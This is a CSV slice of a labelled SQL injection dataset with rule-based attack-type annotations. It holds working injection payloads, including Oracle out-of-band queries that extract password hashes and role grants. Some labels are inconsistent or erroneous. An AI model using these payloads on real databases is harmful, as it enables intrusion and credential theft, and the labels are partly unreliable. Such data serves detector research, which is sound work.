row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
600,or pg_sleep ( __TIME__ ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
601,or '1' = '1'--,1,,boolean_blind,generic,0.85,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
602,"select * from users where id = 1 or 1#""1 union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
603,"select * from users where id = 1 or 1#"". = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
604,"select * from users where id = 1 or @#""{ = 1 union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @#""{ = 1 union select detected — union_based injection (priority 7) on generic",rule-based
605,AND 1 = utl_inaddr.get_host_address ( ( SELECT COUNT ( DISTINCT ( USERNAME ) ) FROM SYS.ALL_USERS ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
606,sqlvuln,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
607,"select * from users where id = 1 or "".{"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
608,"select * from users where id = 1 or 1#""; union select 'a',version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
609,0x730065006c0065006300740020004000400076006500 ...,1,,rce,generic,0.95,0x730065006c0065006300740020004000400076006500 detected — rce injection (priority 1) on generic,rule-based
610,"select * from users where id = 1 union select 1 1$,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
611,"select * from users where id = 1. <@ union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
612,declare @s varchar ( 8000 ) select @s = 0x73656c65637420404076657273696f6e,1,,rce,generic,0.95,"0x73656c65637420404076657273696f6e, declare @s varchar detected — rce injection (priority 1) on generic",rule-based
613,select * from users where id = '1' or \<$ or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
614,or ''&',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
615,"select * from users where id = 1 or ""?_"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
616,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( column_name ) FROM ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns ) WHERE LIMIT = 6 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
617,"select * from users where id = '1' union select \.%1,@@VERSION -- 1'",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
618,"select * from users where id = 1 or 1#""$ union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
619,or 'something' = 'some'+'thing',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
620,#NAME?,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
621,declare @q nvarchar ( 4000 ) select @q =,1,,union_based,generic,0.95,@q nvarchar ( 4000 ) select detected — union_based injection (priority 7) on generic,rule-based
622,"select * from users where id = 1.&&@ union select 1,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
623,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( granted_role ) FROM ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
624,"select * from users where id = 1 or ""@ ( "" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
625,"select * from users where id = 1 + @<@# union select null,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @<@# union select detected — union_based injection (priority 7) on generic",rule-based
626,"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
627,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( PASSWORD ) FROM ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ ) WHERE LIMIT = 1 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
628,"select * from users where id = 1 +1<@ union select version ( ) ,version ( ) -- 1",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
629,"select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
